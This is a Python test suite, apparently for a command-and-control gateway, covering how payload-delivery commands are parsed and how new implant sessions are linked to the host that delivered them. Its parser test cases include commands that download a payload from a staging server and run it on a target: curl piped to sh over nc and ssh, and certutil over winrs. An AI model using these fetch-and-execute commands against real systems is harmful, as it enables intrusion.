#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Web 投递链（delivery chain）验收。

覆盖：
  * 投递命令解析（nc / winrs / ssh / 非投递命令）
  * AppState 投递边设置、持久化、清除、环检测
  * 新会话上线时按目标 IP + 时间窗自动匹配
"""
from __future__ import annotations

import sys
import tempfile
import time
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from gateway import Gateway, delivery_target_from_command  # noqa: E402
from state import AppState  # noqa: E402

CHECKS: list[tuple[str, bool, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    CHECKS.append((name, bool(ok), detail))
    print(("  [PASS] " if ok else "  [FAIL] ") + name + (f"  ({detail})" if detail and not ok else ""))


def test_parser() -> None:
    print("\n[1] 投递命令解析")
    cases = [
        ("shell printf '%s\\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.10.10 2222",
         "10.10.10.10"),
        ('shell winrs -r:10.10.20.10 -u:.\\u -p:p "cmd /c certutil -urlcache -split -f '
         'http://192.168.121.132:9901/swt C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat"',
         "10.10.20.10"),
        ("shell ssh kali@10.10.30.10 'curl -fsSL http://192.168.121.132:9901/slt | sh'", "10.10.30.10"),
        ("shell ipconfig /all", None),
        ("shell echo http://192.168.121.132:9901/slt", None),
    ]
    for command, expected in cases:
        got = delivery_target_from_command(command)
        check(f"解析 {command[:52]}…", got == expected, f"got={got} want={expected}")


def test_state() -> None:
    print("\n[2] 投递边状态与持久化")
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        st = AppState(data_dir=root)
        st.sessions.update({"A": {"id": "A"}, "B": {"id": "B"}, "C": {"id": "C"}})
        record = st.set_delivery_edge("B", "A", command="nc 10.10.10.10 2222", task_id="T1", source="auto")
        check("设置后 session.delivery_parent", st.sessions["B"].get("delivery_parent") == "A")
        check("record.source=auto", record.get("source") == "auto")
        path = root / "delivery_edges.json"
        check("写入 delivery_edges.json", path.is_file())
        mode = path.stat().st_mode & 0o777
        check("文件权限 0600", mode == 0o600, oct(mode))

        st.set_delivery_edge("C", "B", source="manual")
        st2 = AppState(data_dir=root)
        st2.sessions.update({"A": {"id": "A"}, "B": {"id": "B"}, "C": {"id": "C"}})
        check("重载后边仍在", st2.delivery_edges.get("C", {}).get("parent") == "B")

        try:
            st2.set_delivery_edge("A", "C", source="manual")
            check("环检测", False, "允许 A→C→B→A")
        except ValueError:
            check("环检测", True)

        try:
            st2.set_delivery_edge("A", "A", source="manual")
            check("自环拒绝", False)
        except ValueError:
            check("自环拒绝", True)

        st2.sessions["B"].pop("delivery_parent", None)
        st2.sessions["B"].pop("delivery", None)
        check("清除返回 True", st2.clear_delivery_edge("B") is True)
        check("清除后文件无 B", "B" not in st2.delivery_edges)
        # 新会话 upsert 时自动挂上已有的边
        info = {
            "NameID": "B", "User": "root", "Hostname": "bogon", "InternalIP": "10.10.20.10",
            "ExternalIP": "10.10.20.10", "Process": "/tmp/x", "PID": "1", "OS": "Linux",
            "Active": True, "SleepDelay": 0, "SleepJitter": 0,
        }
        st2.set_delivery_edge("B", "A", source="manual")
        sess = st2.upsert_session(info)
        check("upsert 挂载 delivery_parent", bool(sess and sess.get("delivery_parent") == "A"))


def test_match() -> None:
    print("\n[3] 新会话自动匹配")
    with tempfile.TemporaryDirectory() as tmp:
        gw = Gateway.__new__(Gateway)
        gw.state = AppState(data_dir=Path(tmp))
        gw.state.sessions = {
            "P": {"id": "P", "external_ip": "192.168.121.132", "internal_ip": "192.168.121.132"},
            "C": {"id": "C", "external_ip": "10.10.20.10", "internal_ip": "10.10.20.10"},
        }
        gw.delivery_pending = [{
            "source": "P", "target_ip": "10.10.20.10", "task_id": "T9",
            "command": "nc 10.10.20.10 2222", "ts": time.time(),
        }]
        record = gw._match_delivery_edge("C")
        check("按 IP 匹配并写边", bool(record and record.get("parent") == "P"))
        check("匹配后消费 pending", gw.delivery_pending == [])
        check("session 字段同步", gw.state.sessions["C"].get("delivery_parent") == "P")

        gw.state.sessions["D"] = {"id": "D", "external_ip": "10.10.30.10", "internal_ip": "10.10.30.10"}
        gw.delivery_pending = [{
            "source": "P", "target_ip": "10.10.20.10", "task_id": "T10",
            "command": "nc 10.10.20.10 2222", "ts": time.time(),
        }]
        check("IP 不匹配不写边", gw._match_delivery_edge("D") is None)


def main() -> int:
    test_parser()
    test_state()
    test_match()
    failed = [item for item in CHECKS if not item[1]]
    print("\n" + "=" * 60)
    print(f"通过 {len(CHECKS) - len(failed)} / {len(CHECKS)}")
    if failed:
        for name, _, detail in failed:
            print(f"  FAIL: {name} {detail}")
        return 1
    print("投递链验收全部通过")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
